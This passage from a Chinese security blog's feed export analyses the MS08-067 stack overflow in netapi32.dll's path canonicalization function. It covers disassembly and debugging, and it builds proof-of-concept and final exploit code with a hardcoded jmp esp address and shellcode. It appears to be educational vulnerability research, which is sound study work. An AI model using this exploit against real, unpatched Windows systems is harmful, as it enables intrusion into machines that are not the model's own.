Source: Buff_OF</span><br><span class="line">5FDDA247 push [ebp+Outbuf] ; Dest: same as can_path</span><br><span class="line">5FDDA24D call ds:__imp_wcscpy</span><br><span class="line">5FDDA253 pop ecx</span><br><span class="line">5FDDA254 pop ecx</span><br><span class="line">5FDDA255 xor eax, eax</span><br><span class="line">5FDDA257 @@chk_security_cookie:</span><br><span class="line">5FDDA257 mov ecx, [ebp+security_cookie]</span><br><span class="line">5FDDA25A pop edi</span><br><span class="line">5FDDA25B pop esi</span><br><span class="line">5FDDA25C pop ebx</span><br><span class="line">5FDDA25D call chk_security_cookie</span><br><span class="line">5FDDA262 leave</span><br><span class="line">5FDDA263 retn 14h</span><br><span class="line">...</span><br><span class="line">5FDE88F9 @@chk_retsize:</span><br><span class="line">5FDE88F9 mov ecx, [ebp+RetSize]</span><br><span class="line">5FDE88FF test ecx, ecx</span><br><span class="line">5FDE8901 jz short @@err_buf_too_small</span><br><span class="line">5FDE8903 mov [ecx], eax</span><br><span class="line">5FDE8905 @@err_buf_too_small:</span><br><span class="line">5FDE8905 mov eax, NERR_BufTooSmall</span><br><span class="line">5FDE890A jmp @@chk_security_cookie</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="认识-legacy-folder"><a class="markdownIt-Anchor" href="#认识-legacy-folder"></a> 认识 Legacy Folder</h1><p>Legacy Folder，又叫经典目录，指的是 ’.‘ (当前目录) 和 ‘…’ (上一层目录)这两个特殊的目录。</p><p>在对路径进行范式化的过程中，函数 RemoveLegacyFolder 的作用就是将合并路径中的经典目录移去（后面简称“移经”），使路径达到最简洁状态。</p><h1 id="移经-测试"><a class="markdownIt-Anchor" href="#移经-测试"></a> “移经” 测试</h1><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png" alt="image-20220719143626519" style="zoom:67%;"><p>通过黑盒测试，可以看出 RemoveLegacyFolder 函数具有以下特性：</p><p>1）通过 II、 III 对比，目录名是以‘\’作为隔离符的，如果‘…\’ 的左边没有隔离符了，“移经”将失败；<br>2）由 VIII 可以看出，在路径中部（注意，不是首部），如果有两个连续的隔离符‘\’，“移经”将失败；<br>3） XI 的返回值非零，但是合并路径中却有内容，表明“移经”操作应该通过并已经复制到 can_path 中，很可能是在最后的检查过程中，出现了错误。通过查看汇编代码，原来在路径合并结束后， NetpaPathCanonicalize 还会调用 NetpwPathType 函数对合并路径进行检查，并将 NetpwPathType 的结果作为整个函数的返回值。 XI 中的合并路径\\aaa 显然不是一个合法的路径</p><h1 id="移经-风险"><a class="markdownIt-Anchor" href="#移经-风险"></a> “移经” 风险</h1><p>‘ <code>.\</code>’ 的移去操作很简单：只需要调用一次字符复制函数即可将 “经典目录” 移去。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719144447435.png" alt="image-20220719144447435" style="zoom: 50%;"></p><p>‘<code>..\</code>’ 的移去操作却麻烦了不少：</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719214318308.png" alt="image-20220719214318308"></p><p>如果 p1 为当前指针， p2 和 p1 总是相差 3 个字符的位置，但仅凭 p1、 p2 是无法获取 p3 ，因为 FOLDER2 的长度不固定，对于获取 p3 的位置，主要有两种解决方法：</p><ul><li><strong>事先定义变量记录每一个 \ 的位置</strong>；当复制结束后，当前指针 p1 的值更新为 p3， p3 的值更新为 p4；同 p3 一样， p4 也需要变量进行记录。</li><li><strong>如果不定义变量</strong>，则可以在“移经”后的路径中，从 p1 左侧开始，向左搜索首次出现的 ‘\’，即 p3；如果 p1 依然指向经典目录 ‘…\’，那么 p3 就是下一次 “移经” 复制的目的地址。</li></ul><p>RemoveLegacyFolder 函数采用的是不定义变量更新 p3，然而正是这个 “向左（前）搜索” 存在着 “风险”。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>函数调用链 <code>NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder</code></p><h3 id="netpwpathcanonicalize"><a class="markdownIt-Anchor" href="#netpwpathcanonicalize"></a> NetpwPathCanonicalize</h3><p>**函数作用：**NetpwPathCanonicalize用于格式化网络路径字符串。</p><p>如果prefix串非空，将prefix串与path串用<code>\</code>相连，并复制输出到串<code>can_path</code>中，输出串的容量为maxbuf字节大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix + &#x27;\&#x27; + path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p><strong>函数原型</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int <span class="title function_">NetpwPathCanonicalize</span><span class="params">(</span></span><br><span class="line"><span class="params">    Uint16 path[ ],            <span class="comment">// [in]    path name</span></span></span><br><span class="line"><span class="params">    Uint8 can_path[ ],        <span class="comment">// [out]  canonicalized path</span></span></span><br><span class="line"><span class="params">    Uint32 maxbuf,            <span class="comment">// [in]     max size of can_path</span></span></span><br><span class="line"><span class="params">    Uint16 prefix[ ],        <span class="comment">// [in]     path prefix</span></span></span><br><span class="line"><span class="params">    Uint32* pathtype,        <span class="comment">// [int out] path type</span></span></span><br><span class="line"><span class="params">    Uint32 pathflags        <span class="comment">// [in]    path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>通过 NetpwPathCanonicalize 函数，找到 CanonicalizePathName 函数。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719230053057.png" alt="image-20220719230053057"></p><p>在CanonicalizePathName 中找到 RemoveLegacyFolder 函数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719221744326.png" alt="image-20220719221744326"></p><h2 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h2><p>在调用 RemoveLegacyFolder 时，RemoveLegacyFolder 的返回地址位于 0x12F6A4；待处理的合并路径，即 Buff_OF（ 0x12F6A8）指向的 unicode 串位于稍大的栈地址 0x12F6C0，是唯一的输入参数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719222947145.png" alt="image-20220719222947145"></p><p>在移去经典目录‘ …\’后， RemoveLegacyFolder 函数会向左（前）即低地址空间搜索隔离字符‘ \’，如果前向搜索越过了待处理串的起始字符，即小于 0x12F6C0，搜索的结果将不可控，很可能远小于 ESP；当合并路径中再次出现经典目录‘ …\’并需要移去时，复制操作会将路径数据写入前面搜索到的栈地址，产生溢出，如果路径数据经过精心设计，很可能使某个函数的返回地址被覆盖修改，使溢出被成功利用。</p><p>总结，成功溢出的条件：<br>1）充分条件：前向搜索隔离符时，越过了 Buff_OF 指向的待处理串。<br>2）必要条件：合并路径中至少存在两个连续的经典目录‘…\’。<br>3）必要条件：合并路径中第二个‘…\’后有足够多的字符数以覆盖返回地址。</p><h1 id="poc-的构造"><a class="markdownIt-Anchor" href="#poc-的构造"></a> POC 的构造</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行结果：<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719223324355.png" alt="image-20220719223324355"></p><p>NetpwPathCanonicalize 函数正常返回，但是在输出的合并路径中，仍然存在一个经典目录 ‘ …\’，此时，我们可以结合静态分析，探究一下原因。以下是去除 ‘ …\’ 的相关汇编代码，变量 p1、 p2、p3 的定义请参看图 26.4.5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA2BD @@period_found:</span><br><span class="line">5FDDA2BD lea eax, [esi-2] ; esi 为当前指针 p1，此时 p1 指向‘.’</span><br><span class="line">5FDDA2C0 cmp ebx, eax ; ebx 始终指向最新的‘\’，即 p2</span><br><span class="line">5FDDA2C2 jnz @@period_after_nonslash</span><br><span class="line">; 判断是否是经典目录：‘\.’或‘\..’</span><br><span class="line">5FDDA2C8 @@period_after_slash:</span><br><span class="line">5FDDA2C8 lea eax, [esi+2] ; eax 指向下一字符</span><br><span class="line">5FDDA2CB mov dx, [eax]</span><br><span class="line">5FDDA2CE cmp dx, &#x27;.&#x27; ; 是否‘\..’</span><br><span class="line">5FDDA2D2 jnz @@nonperiod_after_period</span><br><span class="line">5FDDA2D8 lea eax, [esi+4] ; eax 指向下两个字符</span><br><span class="line">5FDDA2DB mov bx, [eax]</span><br><span class="line">5FDDA2DE cmp bx, &#x27;\&#x27; ; 是否‘/../’</span><br><span class="line">5FDDA2E2 jz short @@skip_spps_by_copy</span><br><span class="line">5FDDA2E4 test bx, bx</span><br><span class="line">5FDDA2E7 jnz short @@move_forward</span><br><span class="line">5FDDA2E9 @@skip_spps_by_copy:</span><br><span class="line">5FDDA2E9 test edi, edi ; edi 指向 p2 之前的‘\’，即 p3</span><br><span class="line">5FDDA2EB jz @@exit_fail</span><br><span class="line">5FDDA2F1 push eax</span><br><span class="line">5FDDA2F2 push edi</span><br><span class="line">5FDDA2F3 call ds:__imp_wcscpy ; 移经操作： wcscpy(p3, p1)</span><br><span class="line">5FDDA2F9 test bx, bx</span><br><span class="line">5FDDA2FC pop ecx</span><br><span class="line">5FDDA2FD pop ecx</span><br><span class="line">5FDDA2FE jnz @@update_current_slash_after_copy</span><br><span class="line">…</span><br><span class="line">5FDE87F8 @@update_current_slash_after_copy:</span><br><span class="line">5FDE87F8 mov [ebp+current_slash], edi ; p2 &lt;= p3</span><br><span class="line">5FDE87FB mov esi, edi ; p1 &lt;= p3</span><br><span class="line">5FDE87FD lea eax, [edi-2] ; eax &lt;= p3-2，作为向前搜索‘/’</span><br><span class="line">                                ; 的初始指针，但是这里直接将指针</span><br><span class="line">                                ; 减 2，而没有做边界检查，这是导致</span><br><span class="line">                                ; 溢出的根本原因！</span><br><span class="line">5FDE8800 jmp short @@check_previous_slash_after_copy</span><br><span class="line">5FDE8802 @@loop_search_previous_slash:</span><br><span class="line">5FDE8802 cmp eax, [ebp+arg_Path] ; 这里的边界检查已无济于事，因为</span><br><span class="line">                                ; 在 0x5FDE87FD 处 eax 已经越界！</span><br><span class="line">                                ; 注： arg_Path 就是 Buff_OF</span><br><span class="line">5FDE8805 jz short @@previous_slash_found_after_copy</span><br><span class="line">5FDE8807 dec eax</span><br><span class="line">5FDE8808 dec eax</span><br><span class="line">5FDE8809 @@check_previous_slash_after_copy:</span><br><span class="line">5FDE8809 cmp word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE880D jnz short @@loop_search_previous_slash</span><br><span class="line">5FDE880F @@previous_slash_found_after_copy:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，位于 0x5FDDA2F3 处 wcscpy 函数运行后，完成了一次“移经”操作。接着代码 0x5FDE87F8 至 0x5FDE87FD 更新相关指针。位于 0x5FDE8800 至 0x5FDE880D 的循环代码用于向前搜索隔离字符指针 p3，<strong>尽管在循环过程中，代码有做边界检查，但是在循环初始化时却没有（见 0x5FDE87FD），而直接将指针初值 EDI 减 2</strong>；一旦初始化越界，循环过程中的边界检查将失效，因为指针 EAX 永远小于 Buff_OF 的起始字符地址，而循环退出的唯一条件是在低地址空间中再次找到隔离字符‘ \’。</p><p>调试到前向搜索越界时的状态。Buff_OF 位于 0x12F6C0，但是前向搜索的指针 EAX 已经被初始化为 0x12F6BE，小于 Buff_OF 了，我们不妨称这个指针为 previous_slash。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719231639738.png" alt="image-20220719231639738"></p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719232209182.png" alt="image-20220719232209182"></p><p>由于 previous_slash (=EAX) 远小于 ESP，当再次调用 wcscpy 进行字符复制时，如果复制通过精心设计， wcscpy 函数的栈帧和返回地址将被覆盖修改，也就是说当 wcscpy 退出时，溢出会被成功利用。</p><blockquote><p>提示：尽管微软在 Windows XP SP2 及之后的操作系统中引入了 security cookie 机制防止缓冲区溢出，但是 wcscpy 函数依然没有并没有采用该机制，因此 MS08-067 可以在多种操作系统上成功溢出。</p></blockquote><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720080253266.png" alt="image-20220720080253266"></p><p>计算要覆盖到返回地址的字符长度，wcscpy 的返回地址位于 0x0012F684，prefix_slash 位于 0x0012F5A2 (EDI)。需要230个字符（0x0012F684 - 0x0012F5A2+0x4 = 0xe6）就能覆盖到返回地址了。</p><p>具备溢出功能的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设计出最终的 exploit代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP_ESP  <span class="string">&quot;\x0b\xe9\xe0\x5f\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">FreeLibrary(handle);</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)SHELL_CODE);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720105512544-16583052120081.png" alt="image-20220720105512544" style="zoom:67%;">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ms08-067-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ms08-067-简介&quot;&gt;&lt;/a&gt; MS08-067 简介&lt;/h1&gt;
&lt;p&gt;MS08-067 漏洞是由于 netapi32.dll 的导出函</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS06-040</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/</id>
    <published>2022-07-20T08:14:55.000Z</published>
    <updated>2022-08-01T11:19:57.752Z</updated>
    
